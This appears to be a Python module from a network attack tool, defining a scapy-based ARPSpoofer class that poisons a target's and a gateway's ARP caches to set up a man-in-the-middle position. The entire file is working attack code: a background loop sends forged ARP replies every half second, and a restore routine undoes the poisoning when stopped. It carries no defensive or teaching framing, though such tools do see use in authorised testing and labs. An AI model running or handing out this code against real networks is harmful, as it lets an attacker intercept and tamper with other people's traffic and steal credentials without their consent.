from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr
import threading
import subprocess

class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip, target_mac, on_log):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.on_log = on_log
        self.stop_event = threading.Event()
        self.thread = None
        try:
            self.attacker_mac = get_if_hwaddr(interface)
        except Exception as e:
            self.on_log(f"[-] Error getting interface MAC: {e}")
            self.attacker_mac = "00:00:00:00:00:00"

    def start(self):
        self.thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.stop_event.set()
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=2)
        self._restore_network()
        self.on_log(f"[!] Stopped MITM on {self.target_ip}")

    def _spoof_loop(self):
        self.on_log(f"[*] Starting ARP Spoofing on {self.target_ip}...")
        try:
            subprocess.run(["ping", "-c", "1", self.gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ping", "-c", "1", self.target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            gateway_mac = getmacbyip(self.gateway_ip)
            if not gateway_mac:
                self.on_log("[-] Could not get Gateway MAC address. Aborting.")
                return

            while not self.stop_event.is_set():
                ether_to_target = Ether(src=self.attacker_mac, dst=self.target_mac)
                arp_to_target = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.attacker_mac)
                sendp(ether_to_target / arp_to_target, iface=self.interface, verbose=0)
                
                ether_to_gateway = Ether(src=self.attacker_mac, dst=gateway_mac)
                arp_to_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip, hwsrc=self.attacker_mac)
                sendp(ether_to_gateway / arp_to_gateway, iface=self.interface, verbose=0)
                
                self.stop_event.wait(0.5)
                
        except Exception as e:
            if not self.stop_event.is_set():
                self.on_log(f"[-] Spoofing error: {e}")

    def _restore_network(self):
        self.on_log(f"[*] Restoring network for {self.target_ip}...")
        try:
            gateway_mac = getmacbyip(self.gateway_ip)
            if gateway_mac:
                ether_to_target = Ether(src=self.attacker_mac, dst=self.target_mac)
                arp_to_target = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
                sendp(ether_to_target / arp_to_target, iface=self.interface, verbose=0, count=5)
                
                ether_to_gateway = Ether(src=self.attacker_mac, dst=gateway_mac)
                arp_to_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
                sendp(ether_to_gateway / arp_to_gateway, iface=self.interface, verbose=0, count=5)
        except Exception as e:
            self.on_log(f"[-] Error restoring network: {e}")